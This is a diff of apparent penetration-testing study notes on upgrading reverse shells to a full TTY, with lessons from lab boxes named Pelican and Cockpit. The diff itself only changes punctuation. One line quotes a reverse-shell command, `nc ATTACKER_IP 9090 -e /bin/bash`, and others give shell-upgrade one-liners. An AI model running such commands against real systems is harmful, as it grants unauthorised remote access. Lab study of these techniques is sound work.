@@ -55,14 +55,14 @@ Windows shells don't need TTY upgrades in the same way. Use:
 
 ## From Your Boxes
 
-> **Pelican** (PG/Linux) — Used `script /dev/null` for TTY upgrade when Python wasn't the first choice
+> **Pelican** (PG/Linux) - Used `script /dev/null` for TTY upgrade when Python wasn't the first choice
 > - What worked: `script /dev/null -c /bin/bash` after catching reverse shell via nc
 > - Lesson: `script /dev/null` is a solid alternative to Python pty spawn. Works on systems where python3 path is non-standard
 
-> **Cockpit** (PG/Linux) — Same `script /dev/null` pattern after getting shell through custom nc binary
+> **Cockpit** (PG/Linux) - Same `script /dev/null` pattern after getting shell through custom nc binary
 > - What worked: `script /dev/null -c /bin/bash` immediately after `./nc ATTACKER_IP 9090 -e /bin/bash` connected
-> - Lesson: Always upgrade immediately — you need a real TTY for `sudo -l`, password prompts, and tab completion
+> - Lesson: Always upgrade immediately - you need a real TTY for `sudo -l`, password prompts, and tab completion
 
-> **Course Materials** (SSH tunneling notes) — Every SSH tunnel guide starts with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+> **Course Materials** (SSH tunneling notes) - Every SSH tunnel guide starts with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 > - What worked: Spawning PTY was required before SSH dynamic/remote forwarding would work properly from a reverse shell
 > - Lesson: SSH commands from a reverse shell REQUIRE a PTY. If you skip the upgrade, SSH will fail with "Pseudo-terminal will not be allocated"
